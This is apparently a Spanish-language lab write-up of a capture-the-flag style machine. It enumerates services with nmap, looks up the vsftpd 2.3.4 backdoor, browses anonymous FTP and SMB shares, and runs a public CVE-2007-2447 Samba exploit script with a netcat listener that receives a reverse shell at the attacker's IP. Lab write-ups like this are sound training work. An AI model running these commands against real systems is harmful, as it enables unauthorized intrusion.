### NMAP
```
nmap -p- -Pn -sS -sV 10.129.76.241
```
![[Pasted image 20260118171642.png]]
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.3.4
22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
3632/tcp open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))

### SEARCHSPLOIT FTP
```
searchsploit vsftpd 2.3.4
```
![[Pasted image 20260118172542.png]]
vsftpd 2.3.4 - Backdoor Command Execution     | unix/remote/49757.py
vsftpd 2.3.4 - Backdoor Command Execution (Me | unix/remote/17491.rb

Copiamos el script para manejarlo más facilmente
```
cp /usr/share/exploitdb/exploits/unix/remote/49757.py Downloads/
```


### FTP
Accedemos por FTP al servidor
```
ftp 10.129.76.241
```
Accedemos con el usuario anonymous que no necesita contraseña
![[Pasted image 20260118174825.png]]
No conseguimos información relevante por lo que vamos a emplear el script ubicado en la ruta de descargas
![[Pasted image 20260118174951.png]]
Ejecutamos el script pero observamos que no abre ninguna terminal para lanzar comandos por que podría no tener utilidad
```
#python3 Downloads/49757.py 10.129.76.241
```
![[Pasted image 20260118175005.png]]

### SMB
Enumeramos los recursos a los que tenemos acceso de forma anónima
```
#smbclient -L //10.129.76.241 -N
```
![[Pasted image 20260118180213.png]]
tmp             Disk      oh noes!

Accedemos al recurso tmp de forma anónima
```
smbclient -N \\\\10.129.76.241\\tmp
```
![[Pasted image 20260118180425.png]]
No parece haber ningún archivo con utilidad

Buscamos un exploit para la versión de samba 3.0.20 
```
https://github.com/h3x0v3rl0rd/CVE-2007-2447
```

Lanzamos el script pero da error
```
#python3 Downloads/CVE-2007-2447-main/smb3.0.20.py -lh 127.0.0.1 -lp 139 -t 10.129.76.241
```
![[Pasted image 20260118182140.png]]

Seguimos las indicaciones del procedimiento de github
```
python3.11 -m pip install --upgrade pip
```
![[Pasted image 20260118182407.png]]Confirmamos que se ha instalado correctamente
```
python3 -c "import smb; print('pysmb is installed')"
```
pysmb is installed

Lanzamos un netcat a la escucha en el puerto 4444
```
nc -lvnp 4444
```

Lanzamos de nuevo el script
```
python3 Downloads/CVE-2007-2447-main/smb3.0.20.py -lh 10.10.14.27 -lp 4444 -t 10.129.76.241
```

Obtenemos acceso al servidor 
![[Pasted image 20260118183059.png]]
![[Pasted image 20260118183109.png]]